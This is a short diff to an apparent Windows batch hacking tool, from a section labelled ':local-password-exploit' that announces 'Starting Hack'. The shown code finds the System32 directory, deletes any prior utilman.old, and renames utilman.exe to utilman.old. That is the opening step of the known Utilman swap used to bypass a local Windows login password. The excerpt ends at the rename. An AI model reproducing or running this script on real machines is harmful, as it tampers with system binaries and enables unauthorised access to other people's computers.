@@ -116,10 +116,16 @@ goto :menu
 
 :local-password-exploit
 cls
+set "UtilmanOldPath=C:\Windows\System32\utilman.old"
 echo Starting Hack
 echo.
 if exist "c:\windows\system32" (
   echo System Directory Found	
+  if exist "%UtilmanOldPath%" (
+    echo Found existing utilman.old, deleting...
+    del "%UtilmanOldPath%"
+  )
+
   echo Renaming utilman.exe to utilman.old
   echo.
   ren C:\windows\system32\utilman.exe utilman.old || goto :cmdFail
